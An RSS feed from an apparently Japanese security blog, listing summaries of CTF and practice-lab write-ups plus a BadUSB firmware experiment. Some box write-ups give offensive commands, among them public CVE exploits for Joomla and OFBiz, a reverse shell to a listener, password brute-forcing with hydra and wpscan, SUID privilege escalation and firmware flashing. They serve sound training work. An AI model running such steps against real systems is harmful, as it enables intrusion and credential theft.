<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>お茶は綾鷹派</title>
    <link>http://side-realms.github.io/</link>
    <description>Recent content on お茶は綾鷹派</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 10 Sep 2024 20:28:52 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>AutomotiveCTF</title>
      <link>http://side-realms.github.io/writeup/automotivectf/</link>
      <pubDate>Tue, 10 Sep 2024 20:28:52 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/automotivectf/</guid>
      <description>automotiveCTF に参加しました． 30/382, 14/143 でした． 初めてチームで参加していました (!?)．
自分が解いた or 関わった問題だけ writeup を書きます．
# writeup 書こうと思ったら問題サーバが一日足らずで閉じていたので (!?) 覚えている範囲だけです
OSINT Scanning Plates ナンバープレートを検索するとリトアニアの記事がでてきます． なので答えはリトアニア
I know a lot about cars google photo で検索するとランボルギーニの記事が出てきます． 型も一緒に出てくるのでこれがこたえ
We&amp;rsquo;ll see in the Mach-E ログファイルが渡されて，どの通りを通っていた？とかどのラジオを聴いていた？とかの質問に答えます． 頑張ってログを眺めて答えを見つけます．つらい．．．
DID Access 0x4915 で調べる
What is the VIN? Ford のマスタングなので VIN は 3FM から始まります． これで頑張って探す
Street Names ログを眺めると ~~dr みたいな記述があるのでこれをデコード
When were we driving? ログを眺めると 2024 みたいな記述があります． これを含む行だけ抜き出すとよい. 良い感じにデコードして日付のフォーマットになるものを抜き出す
Steering Angle ほぼ勘</description>
    </item>
    
    <item>
      <title>LITCTF2024</title>
      <link>http://side-realms.github.io/writeup/litctf2024/</link>
      <pubDate>Tue, 13 Aug 2024 23:18:46 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/litctf2024/</guid>
      <description>Crypto simple otp 与えられた鍵と XOR する
import random encoded_with_xor = b&amp;#39;\x81Nx\x9b\xea)\xe4\x11\xc5 e\xbb\xcdR\xb7\x8f:\xf8\x8bJ\x15\x0e.n\\-/4\x91\xdcN\x8a&amp;#39; random.seed(0) key = random.randbytes(32) #print(key ^ encoded_with_xor) print(bytes(a ^ b for a, b in zip(key, encoded_with_xor))) privatekey N = 91222155440553152389498614260050699731763350575147080767270489977917091931170943138928885120658877746247611632809405330094823541534217244038578699660880006339704989092479659053257803665271330929925869501196563443668981397902668090043639708667461870466802555861441754587186218972034248949207279990970777750209 e = 89367874380527493290104721678355794851752244712307964470391711606074727267038562743027846335233189217972523295913276633530423913558009009304519822798850828058341163149186400703842247356763254163467344158854476953789177826969005741218604103441014310747381924897883873667049874536894418991242502458035490144319 c = 71713040895862900826227958162735654909383845445237320223905265447935484166586100020297922365470898490364132661022898730819952219842679884422062319998678974747389086806470313146322055888525887658138813737156642494577963249790227961555514310838370972597205191372072037773173143170516757649991406773514836843206 e がデカい
import owiener from Crypto.Util.number import * e = ... n = ... c = ... d = owiener.attack(e, n) print(&amp;#34;d={}&amp;#34;.format(d)) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) pope shuffle it&amp;rsquo;s like caesar cipher but better.</description>
    </item>
    
    <item>
      <title>WaniCTF2024</title>
      <link>http://side-realms.github.io/writeup/wanictf2024/</link>
      <pubDate>Tue, 25 Jun 2024 18:50:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wanictf2024/</guid>
      <description>waniCTF に半日参加しました． 友達はいないのでソロです．
writeup crypto beginners_rsa from Crypto.Util.number import * p = getPrime(64) q = getPrime(64) r = getPrime(64) s = getPrime(64) a = getPrime(64) n = p*q*r*s*a e = 0x10001 FLAG = b&amp;#39;FLAG{This_is_a_fake_flag}&amp;#39; m = bytes_to_long(FLAG) enc = pow(m, e, n) print(f&amp;#39;n = {n}&amp;#39;) print(f&amp;#39;e = {e}&amp;#39;) print(f&amp;#39;enc = {enc}&amp;#39;) Multi Prime RSA です． 与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます. 素因数分解はなんでもいいんですが今回は Msieve を使いました(参考).
from Crypto.Util.number import inverse, long_to_bytes n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347 e = 0x10001 enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265 p = 9953162929836910171 q = 11771834931016130837 r = 12109985960354612149 s = 13079524394617385153 a = 17129880600534041513 phi_n = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (a - 1) d = inverse(e, phi_n) m = pow(enc, d, n) FLAG = long_to_bytes(m) print(FLAG) beginners_aes from Crypto.</description>
    </item>
    
    <item>
      <title>Cryptohack2</title>
      <link>http://side-realms.github.io/writeup/cryptohack2/</link>
      <pubDate>Sun, 09 Jun 2024 20:08:31 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/cryptohack2/</guid>
      <description>Structure of AES def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) Round Key def add_round_key(s, k): for i in range(4): for j in range(4): state[i][j] = state[i][j] ^ round_key[i][j] return (state) print(matrix2bytes(add_round_key(state, round_key))) Confusion through Substitution from Crypto.Util.number import long_to_bytes def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) def sub_bytes(s, sbox=s_box): for i in range(4): for j in range(4): tmp = str(hex(s[i][j]))[2:] #print(tmp[0]) s[i][j] = sbox[int(tmp, base=16)] return(state) Diffusion through Permutation def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3] inv_mix_columns(state) inv_shift_rows(state) print(matrix2bytes(state)) Bringing It All Together N_ROUNDS = 10 key = b&amp;#39;\xc3,\\\xa6\xb5\x80^\x0c\xdb\x8d\xa5z*\xb6\xfe\\&amp;#39; ciphertext = b&amp;#39;\xd1O\x14j\xa4+O\xb6\xa1\xc4\x08B)\x8f\x12\xdd&amp;#39; s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) def bytes2matrix(text): return [list(text[i:i+4]) for i in range(0, len(text), 4)] def matrix2bytes(matrix): out = [] for r in matrix: for c in r: out.</description>
    </item>
    
    <item>
      <title>HTB_devvortex</title>
      <link>http://side-realms.github.io/writeup/htb_devvortex/</link>
      <pubDate>Sat, 08 Jun 2024 15:25:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/htb_devvortex/</guid>
      <description>user nmap ssh, http http まず ffuf で subdomain を探す ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &amp;quot;Host: FUZZ.devvortex.htb&amp;quot; -fw 4 -t 100 次にディレクトリを探す ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic /administrator が見つかる Joomla! で動いている Joomla! https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla version を見つける /administrator/manifests/files/joomla.xml CVE が刺さる https://github.com/Acceis/exploit-CVE-2023-23752 ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: P4ntherg0t1n5r3c0n## DB name: joomla DB prefix: sd4fg_ DB encryption 0 revshell Template -&amp;gt; Customise(Cassiopeia) を編集する error.</description>
    </item>
    
    <item>
      <title>HTB: Bizness</title>
      <link>http://side-realms.github.io/writeup/htb_bizness/</link>
      <pubDate>Wed, 05 Jun 2024 04:49:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/htb_bizness/</guid>
      <description>user nmap ssh, http, ssl/http あたり http アクセスでサイトが立ち上がる ffuf /control OFBiz らしい こういうのはまず公式サイトから構成を簡単にさらう OFBiz Registered User が見つかる 下にバージョンが書いてある HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz CVE CVE が刺さる python3 ofbiz_exploit.py https://bizness.htb shell IP:4444 shell shell に入れた /home/ofbiz/user.txt root sudo -l 無理でした Derby /opt/ofbiz に色々インストールされてる config を見ると SHA が ~ とかいろいろ書かれている ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties derby に関するファイルを探す /opt/ofbiz/runtime/data/derby 列挙すると seg0 に .dat がたくさん入ってる find . -type f -name “*.dat” -exec grep “SHA” {} \; c5490.</description>
    </item>
    
    <item>
      <title>HTB: Beginner</title>
      <link>http://side-realms.github.io/writeup/beginner/</link>
      <pubDate>Fri, 24 May 2024 21:22:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/beginner/</guid>
      <description>HTB, しばらくやってなかったらアカウント忘れてしまった
新しくアカウントを作って starting point も終えたので，やっていきたい
Weak RSA from Crypto.PublicKey import RSA pubkey = RSA.importKey(open(&amp;#34;key.pub&amp;#34;).read()) e = pubkey.e n = pubkey.n print(&amp;#34;e :&amp;#34;, e) print(&amp;#34;n :&amp;#34;, n) これで e, n を計算する． e が巨大なので以下のように攻撃する
import owiener from Crypto.Util.number import * e = 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605 n = 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 d = owiener.attack(e, n) if d is None: print(&amp;#34;Failed&amp;#34;) else: print(&amp;#34;d={}&amp;#34;.format(d)) with open(&amp;#39;flag.enc&amp;#39;, &amp;#39;rb&amp;#39;) as ct: sc = bytes_to_long(ct.read()) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) Jerry nmap: http-proxy 8080 ip:8080 にアクセスする tomcat が開いている /manager/html が管理画面っぽい デフォルトパスワードをブルートフォースすると tomcat:s3cret で通る .</description>
    </item>
    
    <item>
      <title>Lame</title>
      <link>http://side-realms.github.io/writeup/lame/</link>
      <pubDate>Wed, 22 May 2024 21:27:57 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/lame/</guid>
      <description>user enum4linux Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME tmp で anonymous ログインができる ファイルを見てみたがよく分からなかった vmware の authlog のようなものがある samba 3.0.20 がある metasploit で調べると exploit が見つかる 刺さる root metasploit の exploit で root ログインだったので root も手に入れた </description>
    </item>
    
    <item>
      <title>Rev を雑多に解く1</title>
      <link>http://side-realms.github.io/writeup/rev_1/</link>
      <pubDate>Mon, 06 May 2024 05:03:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/rev_1/</guid>
      <description>SECCON Beginners 2023 Half strings で見える
ctf4b{ge4_t0_kn0w_the_bin4ry_fi1e_with_s4ring3}
Three length = strlen(input); if (length == 0x31) { for (local_c = 0; local_c &amp;lt; 0x31; local_c = local_c + 1) { if (local_c % 3 == 0) { cVar1 = (char)*(undefined4 *)(flag_0 + (long)(local_c / 3) * 4); } else if (local_c % 3 == 1) { cVar1 = (char)*(undefined4 *)(flag_1 + (long)(local_c / 3) * 4); } else { cVar1 = (char)*(undefined4 *)(flag_2 + (long)(local_c / 3) * 4); } if (cVar1 !</description>
    </item>
    
    <item>
      <title>Cryptohack1</title>
      <link>http://side-realms.github.io/writeup/cryptohack/</link>
      <pubDate>Sat, 04 May 2024 22:10:33 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/cryptohack/</guid>
      <description>Encoding Challenge from pwn import * # pip install pwntools import json import base64 import codecs r = remote(&amp;#39;socket.cryptohack.org&amp;#39;, 13377) def json_recv(): line = r.recvline() return json.loads(line.decode()) def json_send(hsh): request = json.dumps(hsh).encode() r.sendline(request) def decoding(types, received): if(types == &amp;#34;base64&amp;#34;): answer = base64.b64decode(received).decode() return answer if(types == &amp;#34;hex&amp;#34;): answer = str(bytes.fromhex(received)) return answer[2:len(answer)-1] if(types == &amp;#34;rot13&amp;#34;): answer = codecs.encode(received, &amp;#39;rot_13&amp;#39;) return answer if(types == &amp;#34;bigint&amp;#34;): answer = str(bytes.fromhex(received[2:])) return answer[2:len(answer)-1] if(types == &amp;#34;utf-8&amp;#34;): answer = &amp;#34;&amp;#34; for i in received: answer += chr(i) return answer while (True): received = json_recv() print(&amp;#34;Received type: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;type&amp;#34;]) print(&amp;#34;Received encoded value: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;encoded&amp;#34;]) answer = decoding(received[&amp;#34;type&amp;#34;], received[&amp;#34;encoded&amp;#34;]) print(&amp;#34;answer: &amp;#34;, end=&amp;#34;&amp;#34;) print(answer) to_send = {&amp;#34;decoded&amp;#34;: answer} request = json.</description>
    </item>
    
    <item>
      <title>picoCTF - web</title>
      <link>http://side-realms.github.io/writeup/picoweb/</link>
      <pubDate>Thu, 02 May 2024 10:39:24 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/picoweb/</guid>
      <description>なかなか初心者を抜け出せないので，量をこなそう作戦
解いたことがある問題は記載しない
WebDecode 開発者ツール的なので About ページを見ると怪しい文字列があるので，base64 デコード
Intro to Burp アカウントを作ると OTP を求められる． リクエストの otp= を消してリクエストを送ると OK
curl -X POST http://titan.picoctf.net:54630/dashboard -H &#39;Cookie: session=.eJxdjDkOwyAUBe9CnQIwi8llEBhQkA0fsciKotw9tKSct8wHHbG_0RPFMybIgB7oaDXoDqfPMxZSWYUp3VwQnOzMcUbMrri1WAbiFSaUGSnU_IVxXTqb5Bcb9DKZ4U1wPrGY1m6obtmUF2Sv80jW16UYzdc_4_cH_-A4Iw.ZjLzXA.osPDJuPjvfZFlwhe-7dVDbKhZj0&#39;
Unminify 開発者ツールを見る
Trickster 画像をアップロードできる． アップロードできる系はシェルが通りそうなことを HTB で学んだのでやってみる．
User-agent: * Disallow: /instructions.txt Disallow: /uploads/ robots.txt から /uploads/ にアップロードした画像が置いてあるような気がする． また，X-Powered-By を見れば PHP 製であることが分かるので，PHP が通る．
さらに instructions.txt を見ると，ut wikipedia says that the first few bytes contain &#39;PNG&#39; in hexadecimal: &amp;quot;50 4E 47&amp;quot; ) みたいに書いてあるので， 50 4E 47 -&amp;gt; PNG が書いてあればいいんだと思う</description>
    </item>
    
    <item>
      <title>Badusb</title>
      <link>http://side-realms.github.io/hardware/badusb/</link>
      <pubDate>Sun, 14 Apr 2024 13:53:47 +0900</pubDate>
      
      <guid>http://side-realms.github.io/hardware/badusb/</guid>
      <description>BadUSB をファームウェア書き換えでやってみる.
はじめに 本ポストの実験を実際に試して何か被害があっても筆者は責任をもてません 本ポストは BadUSB の促進を目的にしていません 本ポストの内容を自分の環境以外で行うことは罪に問われる可能性があります 思い出しながら書いてるので抜けがある場合があります モチベーション 昔に参加したセキュリティキャンプで BadUSB を作る講座があった EasyUSB を使っていたのである意味やりやすかった 実際に使われている USB でもできないか実験したい 環境 Psychson Toshiba TC58TEG7T2JTA00 Phison 2251-03 (2303) 以下ブログを参考にしている Psychsonを使用したBadUSBの作成方法 手順 SDCC をインストールする 最新版をインストールする場合は Psychson のビルドに失敗するので，コードを書きかえる必要がある Psychson を展開する DriveCom, EmbededPayload, Injector を Visual Studio でビルド(Build Solution)する バーナーイメージをダウンロード Phison Electronics - USBDev.ru からバーナーイメージをダウンロードする 今回は BN03V104M.BIN を使用 ファームウェアをダンプ tools\DriveCom.exe /drive=E /action=SetBootMode tools\DriveCom.exe /drive=E /action=SendExecutable /burner=BN03V104M.BIN tools\DriveCom.exe /drive=E /action=DumpFirmware /burner=BN03V104M.BIN /firmware=TC58TEG7T2JTA00.bin カスタムファームウェアをビルド build.bat SDCC の最新版をダウンロードした場合は以下を修正する 割り込みハンドラ(__interrupt XXX) を __interrupt(XXX) に直す．つまり割り込み番号とレジスタバンク番号を括弧で囲む 引数無しの関数で void が省略されているので追加する ペイロード作成 USB-Rubber-Ducky を使う java -jar encoder.</description>
    </item>
    
    <item>
      <title>picoCTF の rev 全部解く</title>
      <link>http://side-realms.github.io/writeup/picorev/</link>
      <pubDate>Sun, 07 Apr 2024 19:40:38 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/picorev/</guid>
      <description>CTF の問題を解いていると，解けはするけど異常に時間がかかる，みたいなことが多い． rev に限れば，これは，ツールの使い方が甘かったり，つまみ食い的に rev をやってきたので常識が欠落していて遠回りしていたり，そもそもデコンパイル結果を読む筋力が全然なかったりすることが原因だと分かっている． なので，数をこなそう作戦で，知り合いにオススメされた picoCTF の rev を全部解いてみる． 2~3 日くらいで完走できたら良い
Transformation &#39;&#39;.join([chr((ord(flag[i]) &amp;lt;&amp;lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) をデコードする encoded_flag = &amp;#34;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸弲㘶㠴挲ぽ&amp;#34; flag = [] for i in range(len(encoded_flag)): tmp1 = ord(encoded_flag[i]) &amp;amp; 0xFF tmp2 = ord(encoded_flag[i]) &amp;gt;&amp;gt; 8 flag += chr(tmp2) flag += chr(tmp1) print(&amp;#34;&amp;#34;.join(flag)) keygenme-py Arcane Calculator なるものが動いていて，ライセンスを入れるといいらしい def check_key(key, username_trial): global key_full_template_trial if len(key) != len(key_full_template_trial): return False else: # Check static base key part --v i = 0 for c in key_part_static1_trial: if key[i] !</description>
    </item>
    
    <item>
      <title>Anonforce</title>
      <link>http://side-realms.github.io/writeup/anonforce/</link>
      <pubDate>Sun, 07 Apr 2024 05:14:09 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/anonforce/</guid>
      <description>user ftp に anonymous ログインができる user.txt を見る root 謎に noread ディレクトリがあるのでここの backup.pgp と private.asc をダウンロード gpg2john private.asc &amp;gt; private john --wordlist=/usr/share/wordlists/rockyou.txt private gpg --import private.asc gpg --decrypt backup.pgp shadow ファイルが手に入るので root のパスワードを復元して ssh </description>
    </item>
    
    <item>
      <title>Disgruntled</title>
      <link>http://side-realms.github.io/writeup/disgruntled/</link>
      <pubDate>Sun, 07 Apr 2024 05:07:47 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/disgruntled/</guid>
      <description>Task3 cat /var/log/auth.log |grep install Task4 cat /var/log/auth.log |grep adduser cat /var/log/auth.log |grep visudo cat /var/log/auth.log |grep vi Task5 it-admin がユーザーであることが分かったので cat /home/it-admin/.bash_history cat /home/it-admin/.viminfo ls -la /bin/os-update cat /bin/os-update.sh Task6 cat /etc/crontab </description>
    </item>
    
    <item>
      <title>ACSC 2024 writeup</title>
      <link>http://side-realms.github.io/writeup/acsc2024/</link>
      <pubDate>Sun, 31 Mar 2024 13:24:01 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/acsc2024/</guid>
      <description>ACSC に参加しました． Twitter で hardware ジャンルのある CTF があることを知ったので参加しようと思った次第です． hardware は完答ですが，案の定 hardware 以外は解いていません(解けていません)． 次の writeup で解いてみます． 順位は 800 pts で世界 64/282(?) 位でした.
An4lyz3_1t(50pts, 140 solved) .sal のバイナリデータが与えられます． logic2 で Async Serial デコードするとフラグが得られます． ボーレートに注意する必要がありますが，この程度なら典型的なボーレートでできると思います． もちろん手でもデコードできます．
0(ASCII code) 0111 0(ASCII code) 0111...
みたいな並びになっているので，ASCII code が逆順になっていることに注意して，ゴミを取り除きつつデコードすることができます．
Valut(150pts, 68 solves) 10 桁の PIN をサイドチャネル攻撃しろ，という問題でした． CTF でサイドチャネル攻撃するなら大抵タイミング攻撃なのでそうだろうと思いつつサーバを触ってみます．
時間を測ると，入力した PIN を 1 文字ずつチェックして，正解の PIN と一致していたら 0.1 秒の遅延が入るような仕組みになっているようでした．
以下がスクリプトです． 作り甘いですが&amp;hellip;
from pwn import * import time list = [&amp;#39;0&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;,&amp;#39;4&amp;#39;,&amp;#39;5&amp;#39;,&amp;#39;6&amp;#39;,&amp;#39;7&amp;#39;,&amp;#39;8&amp;#39;,&amp;#39;9&amp;#39;] io = remote(&amp;#39;vault.</description>
    </item>
    
    <item>
      <title>Boiler</title>
      <link>http://side-realms.github.io/writeup/boiler/</link>
      <pubDate>Thu, 28 Mar 2024 00:22:47 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/boiler/</guid>
      <description>user FTP anonymous login .info.txt rabbit hole webmin searchsploit 特になし CMS Joomla Joomla 3.8 joomla-brute とかいろいろ試したけどクレデンシャルが手に入らず RCE 断念 エンドポイントにクレデンシャルが露出しているらしいがアクセスできなかった(ref: How to bypass the admin login page in Joomla &amp;amp; RCE) gobuster をさらにかけると ./_test がアクセスできる それ以外は rabbit hole(いい加減にしてくれ&amp;hellip;) sar2html が動いている searchsploit で探すと RCE ができるらしい ls で log.txt が見つかる cat log.txt でクレデンシャルが見つかる basterd:superduperp@$$ ssh する ssh backup.sh が見つかる パスワードがハードコードしてある stoner にユーザを変える .secret が見つかる root SUID find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&amp;gt; /dev/null find が使えるらしい /usr/bin/find .</description>
    </item>
    
    <item>
      <title>Internal</title>
      <link>http://side-realms.github.io/writeup/internal/</link>
      <pubDate>Wed, 20 Mar 2024 08:06:49 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/internal/</guid>
      <description>user wordpress っぽいので wpscan wpscan --url http://internal.thm/blog -e admin が見つかる wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt パスワードも見つかる wordpress にログインできた Appearance から 404.php を編集してリバースシェルを入れる(WordPress: Reverse Shell) http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php にアクセス aubreanna にしか権限がないため，user.txt が見れない 分からなすぎるので writeup を見ると，/opt にパスワードがあるらしい(は？) su aubreanna で権限昇格 root aubreanna の /home に jenkins.txt がある aubreanna@internal:~$ cat jenkins.txt cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080 ssh トンネル ssh -L 1234:172.17.0.2:8080 aubrenna@internal.thm http://127.0.0.1:8080 で jenkins にアクセスできる hydra 127.0.0.1 -s 8080 -V -f http-form-post &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2F&amp;amp;Submit=Sign+in&amp;amp;Login=Login:Invalid username or password&amp;quot; -l admin -P /usr/share/wordlists/rockyou.</description>
    </item>
    
    <item>
      <title>Rerevand</title>
      <link>http://side-realms.github.io/writeup/rerevand/</link>
      <pubDate>Mon, 18 Mar 2024 09:58:44 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/rerevand/</guid>
